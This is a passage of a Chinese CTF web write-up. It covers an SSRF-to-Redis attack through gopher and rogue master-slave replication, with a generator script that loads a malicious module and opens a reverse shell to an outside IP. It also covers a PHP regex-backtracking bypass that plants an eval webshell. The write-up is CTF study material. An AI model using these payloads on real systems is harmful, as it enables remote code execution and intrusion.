<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=preg_match(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=parse_url(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=gethostbyname(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=ip2long(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> ip2long(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || ip2long(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">20</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">20</span> || ip2long(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">16</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe_request_url</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (check_inner_ip(<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27; is inner ip&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$result_info</span> = curl_getinfo(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>])<br>        &#123;<br>            safe_request_url(<span class="hljs-variable">$result_info</span>[<span class="hljs-string">&#x27;redirect_url&#x27;</span>]);<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br>        var_dump(<span class="hljs-variable">$output</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>实现内网绕过后，hint.php提示Redis的密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    file_put_contents(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>],<span class="hljs-string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>看到这里的时候，其实尝试过利用POST的file参数写木马，但是发现没有写权限。</p>
<p>类似的，redis也没办法直接写shell，因此考虑使用主从复制。</p>
<p>攻击逻辑其实就是利用SSRF使得redis将攻击机作为主机，从而利用主从复制将恶意的so文件加载，实现rce。</p>
<p>在VPS上搭建攻击机，可以参照 https://github.com/n0b0dyCN/redis-rogue-server。</p>
<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401144412655.png" srcset="/img/loading.gif" lazyload alt="image-20230401144412655" /></p>
<p>搭建成功之后，我们构造攻击脚本，此时的数据需要按照redis协议进行相关的编码，可以模仿上面的GitHub repo</p>
<p>需要注意的是，我们将对应的参数构造之后去攻击时，需要对gopher协议再次完成url编码。（url参数上传时会解析一次，libcurl会再次解析）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /etc/passwd&quot;</span></span>):</span><br>    exp_filename = <span class="hljs-string">&quot;exp.so&quot;</span><br>    cmd = [<br>    	<span class="hljs-comment"># 第一次</span><br>        <span class="hljs-string">&quot;CONFIG SET dir /tmp/&quot;</span>,<br>        <span class="hljs-string">&quot;config set dbfilename exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport),<br><br>		<span class="hljs-comment"># 第二次</span><br>        <span class="hljs-string">&quot;MODULE LOAD /tmp/exp.so&quot;</span>,<br>		<br>		<span class="hljs-comment"># 第三次	</span><br>        <span class="hljs-string">&quot;system.exec &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>		<span class="hljs-comment"># 这里有个细节就是使用$&#123;IFS&#125;代替参数中的空格，因为上面的redis_format函数会根据空格来进行分割命令和参数</span><br><br>        <span class="hljs-string">&quot;system.rev 43.143.123.40$&#123;IFS&#125;7788&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>,<br>        <span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>,<br>        <span class="hljs-string">&quot;system.exec rm$&#123;IFS&#125;/tmp/exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>,<br>        <span class="hljs-string">&quot;quit&quot;</span>,<br><br>    ]<br>    <span class="hljs-keyword">if</span> passwd:<br>        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    lhost = <span class="hljs-string">&quot;43.143.123.40&quot;</span><br>    lport = <span class="hljs-string">&quot;7788&quot;</span><br><br>    rhost = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    rport = <span class="hljs-string">&quot;6379&quot;</span><br><br>    passwd = <span class="hljs-string">&quot;root&quot;</span><br><br>    payload = <span class="hljs-string">&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span>  + rport +  <span class="hljs-string">&quot;/_&quot;</span><br><br>    cmd = generate_rce(lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /flag&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        a = redis_format(i)<br>        payload += quote(a)<br>    <br>    <span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
<h2 id="正则相关">12、正则相关</h2>
<h3 id="正则最大回溯绕过">1、正则最大回溯绕过</h3>
<p>简单来说，对于php代码，正则库是依据NAF实现的，因此需要引入回溯机制。</p>
<p>php中设置了最大回溯次数，默认为10万次。</p>
<p>当正则表达式开启了贪心，我们就可以利用正则最大回溯次数的限制从而完成绕过。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;./data/&#x27;</span>;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125; <br></code></pre></td></tr></table></figure>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>files = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">b&quot;&lt;?php file_put_contents(&#x27;hacker.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); ?&gt;&quot;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">1000000</span>)<br>&#125;<br><br>url = <span class="hljs-string">&quot;http://5c447b18-7633-4d09-9eb7-d6caffed7c69.challenge.ctf.show/&quot;</span><br><br>r = requests.post(<br>    url=url,<br>    files=files,<br>    proxies=&#123;<br>        <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>    &#125;<br>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  
    <span>></span>
    
  <a href="/categories/ctf/web/" class="category-chain-item">web</a>
  
  
    <span>></span>
    
  <a href="/categories/ctf/web/wp/" class="category-chain-item">wp</a>
  
  

  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
        <a href="/tags/wp/" class="print-no-link">#wp</a>
      
        <a href="/tags/web/" class="print-no-link">#web</a>
      
        <a href="/tags/NSS/" class="print-no-link">#NSS</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>CTF-Web-wp</div>
      <div>http://example.com/2022/04/13/blog0013-NSS-Web-wp/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>whistle.H</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年4月13日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/13/blog0014-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/" title="ctfshow-反序列化-wp">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ctfshow-反序列化-wp</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/04/11/blog0012-ctfshow-upload-wp/" title="ctfshow-upload-wp">
                        <span class="hidden-mobile">ctfshow-upload-wp</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
